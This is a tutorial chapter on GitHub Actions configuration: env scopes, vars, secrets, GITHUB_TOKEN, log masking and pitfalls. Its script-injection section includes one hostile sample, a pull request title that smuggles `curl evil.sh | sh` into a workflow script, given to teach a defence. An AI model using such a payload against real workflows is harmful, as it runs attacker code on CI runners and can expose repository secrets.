# Variables and Secrets

Workflows need configuration (which environment? which region?) and sensitive values (API keys, passwords). Actions gives you four tools for this: **`env`** for values defined in the workflow file, **`vars`** for non-sensitive configuration stored in GitHub, **`secrets`** for sensitive values stored encrypted in GitHub, and **default variables** that GitHub sets for you.

```
env      →  written in the YAML file
vars     →  stored in GitHub settings, plain text
secrets  →  stored in GitHub settings, encrypted and masked in logs
GITHUB_* →  provided automatically
```

## The simplest example

```yaml
env:
  APP_NAME: my-app                      # workflow-level

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying $APP_NAME"
```

## `env`: three levels of scope

```yaml
env:
  LEVEL: workflow                       # every job and step

jobs:
  demo:
    runs-on: ubuntu-latest
    env:
      LEVEL: job                        # every step in this job
    steps:
      - run: echo "$LEVEL"              # job
      - run: echo "$LEVEL"              # step
        env:
          LEVEL: step                   # only this step
```

The **narrowest scope wins**: step overrides job, job overrides workflow.

| Level | Where | Visible to |
|-------|-------|-----------|
| Workflow | Top-level `env:` | All jobs and steps |
| Job | `jobs.<id>.env` | All steps in that job |
| Step | `steps[*].env` | That step only |

## Two ways to read a variable

```yaml
env:
  GREETING: hello

steps:
  - run: echo "$GREETING"                # shell expands it at run time
  - run: echo "${{ env.GREETING }}"      # GitHub substitutes it BEFORE the shell starts
```

| Syntax | Evaluated by | When | Use for |
|--------|--------------|------|---------|
| `$NAME` | The shell | While the step runs | Most `run:` scripts |
| `${{ env.NAME }}` | GitHub | Before the step starts | Places where the shell does not exist (`if:`, `with:`, `name:`) |

For anything that comes from user input or untrusted data, prefer `$NAME` through `env:`. See the injection section below.

## Setting variables for later steps

An `export` does not survive past the step. Write to `$GITHUB_ENV` instead.

```yaml
steps:
  - run: echo "BUILD_ID=$(date +%s)" >> "$GITHUB_ENV"
  - run: echo "Build is $BUILD_ID"
```

The variable is available from the **next step onward**, not in the current one.

## Default environment variables

GitHub sets these on every run.

| Variable | Example value | Meaning |
|----------|--------------|---------|
| `CI` | `true` | Always true on Actions |
| `GITHUB_REPOSITORY` | `octocat/hello` | Owner and repo name |
| `GITHUB_SHA` | `ffac537...` | Commit that triggered the run |
| `GITHUB_REF` | `refs/heads/main` | Full ref |
| `GITHUB_REF_NAME` | `main` | Short branch or tag name |
| `GITHUB_ACTOR` | `octocat` | User that triggered it |
| `GITHUB_EVENT_NAME` | `push` | Triggering event |
| `GITHUB_RUN_ID` | `1658821493` | Unique per run |
| `GITHUB_RUN_NUMBER` | `42` | Counts up per workflow |
| `GITHUB_WORKSPACE` | `/home/runner/work/repo/repo` | Checkout directory |
| `RUNNER_OS` | `Linux` | Runner operating system |

You cannot create or overwrite variables that start with `GITHUB_`.

## Configuration variables: `vars`

Plain-text values stored in GitHub, so you can change them **without editing a workflow file**.

**Create:** Settings → Secrets and variables → Actions → **Variables** tab.

```yaml
steps:
  - run: echo "Region is ${{ vars.AWS_REGION }}"
```

| Scope | Defined at | Available to |
|-------|-----------|--------------|
| Repository | Repo settings | That repository |
| Environment | Repo settings → Environments | Jobs using that environment |
| Organization | Org settings | Selected repositories |

If the same name exists at several levels, the **most specific** wins: environment, then repository, then organization.

Variables are **not** hidden in logs. Never store credentials in them.

## Secrets

Encrypted values stored in GitHub, for anything sensitive.

**Create:** Settings → Secrets and variables → Actions → **Secrets** tab, or via CLI:

```bash
gh secret set API_KEY                     # prompts for the value
gh secret set API_KEY --env production    # environment secret
```

```yaml
steps:
  - name: Call the API
    run: curl -H "Authorization: Bearer $API_KEY" https://api.example.com/deploy
    env:
      API_KEY: ${{ secrets.API_KEY }}      # explicit, scoped to this step
```

| Property | Detail |
|----------|--------|
| Encrypted | Stored encrypted; GitHub cannot show the value again after you save it |
| Masked in logs | Exact value shown as `***` |
| Scopes | Repository, environment, organization |
| Naming | Letters, digits, `_`; no spaces; cannot start with a number or `GITHUB_` |
| Size limit | 48 KB per secret |
| Fork PRs | **Not** passed to workflows triggered by pull requests from forks (except `GITHUB_TOKEN`, read-only) |

### Scope comparison

| Scope | Best for | Notes |
|-------|----------|-------|
| Repository | Keys used by one project | Simplest |
| Environment | Production vs staging credentials | Can require reviewer approval before the job gets access (chapter 11) |
| Organization | Shared across repos (registry tokens) | Choose which repositories can access it |

## `GITHUB_TOKEN`

An automatically created, short-lived token available as `secrets.GITHUB_TOKEN` (or `github.token`). It expires when the job finishes. Its permissions are controlled by the `permissions:` key (chapter 11).

```yaml
- run: gh pr comment 1 --body "Build passed"
  env:
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

## Secrets cannot be used directly in `if:`

```yaml
# ✗ Does not work
if: ${{ secrets.DEPLOY_KEY != '' }}

# ✓ Copy to env first, then test the env value
env:
  HAS_KEY: ${{ secrets.DEPLOY_KEY != '' }}
steps:
  - if: env.HAS_KEY == 'true'
    run: echo "Key is configured"
```

## Multi-line secrets and structured data

```yaml
env:
  SSH_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
steps:
  - run: |
      mkdir -p ~/.ssh
      printf '%s\n' "$SSH_KEY" > ~/.ssh/id_ed25519
      chmod 600 ~/.ssh/id_ed25519
```

Avoid storing **JSON or YAML blobs** as one secret and extracting fields in the workflow. GitHub masks the full value, but individual pieces may not be masked, so they can show up in logs. Create one secret per sensitive value.

## Masking values you generate

```yaml
- run: |
    TOKEN=$(./get-temporary-token.sh)
    echo "::add-mask::$TOKEN"
    echo "TOKEN=$TOKEN" >> "$GITHUB_ENV"
```

`::add-mask::` tells the runner to hide that value in all later log output.

## Passing secrets to reusable workflows

```yaml
jobs:
  call:
    uses: ./.github/workflows/deploy.yml
    secrets:
      API_KEY: ${{ secrets.API_KEY }}      # pass one
    # or
    # secrets: inherit                     # pass all (same org or enterprise)
```

Secrets are **not** passed automatically; you must opt in. Details in chapter 12.

## Injection warning: keep untrusted data out of `${{ }}` in `run`

```yaml
# ✗ Dangerous: PR title is pasted into the script before the shell parses it
- run: echo "${{ github.event.pull_request.title }}"

# ✓ Pass it through an environment variable
- run: echo "$PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

With the first form, a PR titled `"; curl evil.sh | sh #` runs as code. Chapter 17 covers script injection in depth.

## Where to put what

```
Non-sensitive, same for everyone, changes rarely   →  env in the workflow file
Non-sensitive, changes without a commit            →  vars
API keys, passwords, tokens, private keys          →  secrets
Different value per deployment stage               →  environment-scoped vars/secrets
Short-lived credentials to cloud providers         →  OIDC instead of stored secrets (chapter 17)
```

## Mental model checklist

- `env` is in the file, `vars` and `secrets` are in GitHub settings
- The narrowest scope wins
- `$X` is expanded by the shell, `${{ env.X }}` by GitHub beforehand
- Secrets are masked, but a determined step can still leak them; give them only to steps that need them
- Untrusted text goes through `env:`, never directly into a `run:` expression

## Common questions

| Question | Answer |
|----------|--------|
| `vars` or `env`? | `env` for fixed values in the file; `vars` when you want to change them in settings without a commit |
| Can I read a secret's value in the UI? | No; you can only replace or delete it |
| Why is my secret empty in a PR? | Fork PRs do not receive secrets |
| Does masking guarantee safety? | No; transformed values (base64, split strings) may not be masked, so never print secrets |
| Can workflows read secrets from other repositories? | Only organization secrets shared with the repository |
| Can an environment variable hold a secret? | Yes, via `env: KEY: ${{ secrets.KEY }}`; it exists only for that scope |
| Are secrets inherited by reusable workflows? | Not unless passed explicitly or with `secrets: inherit` |
| Is `GITHUB_TOKEN` a secret I create? | No, GitHub creates it per run |

## Pitfalls

| Pitfall | Why it hurts | Better |
|---------|--------------|--------|
| `export VAR=x` and expecting it in the next step | Each `run` is its own process | Append to `$GITHUB_ENV` |
| Hardcoding credentials in YAML | They end up in git history | Use secrets |
| `echo "$SECRET"` while debugging | Might leak through transformed output | Do not print secrets at all |
| Secrets at the workflow-level `env` | Every step and action sees them | Set them on the step that needs them |
| `${{ github.event.* }}` pasted into `run:` | Script injection | Pass through `env:` |
| Long-lived cloud keys stored as secrets | Big target if leaked | Use OIDC (chapter 17) |
| Expecting `secrets` in `if:` | Not available there | Copy to an env var or job output first |
| JSON blob as a single secret | Parts of it may print unmasked | One secret per value |

## Try it

1. Add a repository variable `GREETING` and a secret `DEMO_SECRET`; print the variable and the *length* of the secret (`echo ${#DEMO_SECRET}`)
2. Write a workflow using the same `env` name at workflow, job, and step level; confirm which value prints in each step
3. Use `$GITHUB_ENV` to set `BUILD_ID` in one step and read it in another

## Key takeaways

- `env` lives in the workflow, `vars` and `secrets` live in GitHub settings
- Narrow scopes override wider ones
- Secrets are masked, scoped (repo, environment, org), and not given to fork PRs
- Use `$GITHUB_ENV` to carry variables forward and `env:` to keep untrusted data out of scripts
- Prefer short-lived credentials (`GITHUB_TOKEN`, OIDC) over long-lived stored keys

**Next:** [Contexts, Expressions, and Conditions](./08_contexts-expressions-conditions.md)
